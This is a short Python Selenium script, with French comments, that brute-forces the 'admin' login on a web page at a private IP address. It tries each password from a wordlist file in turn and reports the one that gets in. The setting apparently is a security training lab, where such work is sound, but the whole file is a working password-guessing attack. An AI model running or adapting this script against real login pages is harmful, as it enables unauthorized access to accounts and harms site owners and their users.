#!/usr/bin/python3

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

# Chemin vers votre WebDriver
driver = webdriver.Chrome(executable_path='/path/to/chromedriver')

# URL du site
site_url = 'http://10.11.249.37/?page=signin'

# Charger les mots depuis le fichier
with open('mots.txt', 'r') as file:
    password_list = [line.strip() for line in file]

# Ouvrir le site
driver.get(site_url)

# Localisation du champ de recherche (par exemple par son ID)
username_field = driver.find_element_by_name('username')
username_field.send_keys("admin")

password_field = driver.find_element_by_name('password')
submit_button = driver.find_element_by_xpath('//button[@type="submit"]')  # Exemple pour un bouton de type submit

for password in password_list:
    password_field.clear()  # Vide le champ avant chaque essai
    password_field.send_keys(password)  # Entrez le mot de passe
    
    submit_button.click()  # Cliquer sur le bouton de soumission

    time.sleep(2)  # Attendre que la page se recharge ou que les résultats s'affichent

    # (Optionnel) Vérifier si la connexion a réussi, sinon revenir en arrière
    if "Login failed" not in driver.page_source:  # Remplacez cette condition selon ce qui indique un échec sur votre site
        print(f"Password found: {password}")
        break  # Sortir de la boucle si le bon mot de passe est trouvé

# Fermer le navigateur
driver.quit()


# with open("10000-most-common-passwords.txt", "r") as file:
#     passwordList = file.read().splitlines()

# print(passwordList[17])